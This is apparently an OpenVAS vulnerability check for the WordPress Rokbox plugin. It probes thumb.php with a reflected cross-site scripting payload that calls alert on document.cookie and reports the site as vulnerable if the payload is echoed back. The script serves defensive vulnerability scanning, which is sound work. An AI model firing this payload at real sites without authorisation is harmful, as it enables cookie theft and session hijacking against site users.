###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Rokbox Plugin Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803079");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2012-12-18 14:38:17 +0530 (Tue, 18 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Rokbox Plugin Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://websecurity.com.ua/6006/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118884/wprokbox-shellspoofdosxss.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site and
  to gain sensitive information like installation path location.");

  script_tag(name:"affected", value:"WordPress Rokbox Plugin versions using TimThumb 1.16 and JW Player 4.4.198");

  script_tag(name:"insight", value:"Flaws are due to an improper validation of user supplied inputs to the
  'src' parameter in 'thumb.php' and 'aboutlink', 'file' and 'config' parameters in 'jwplayer.swf'.");

  script_tag(name:"solution", value:"Update to the WordPress Rokbox Plugin version 2.1.3.");

  script_tag(name:"summary", value:"WordPress Rokbox Plugin is prone to multiple vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.rockettheme.com/wordpress-downloads/plugins/free/2625-rokbox");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/wp_rokbox/thumb.php?src=<body onload=alert(document.cookie)>.jpg';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"alert\(document\.cookie\)", extra_check:"imThumb version")){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
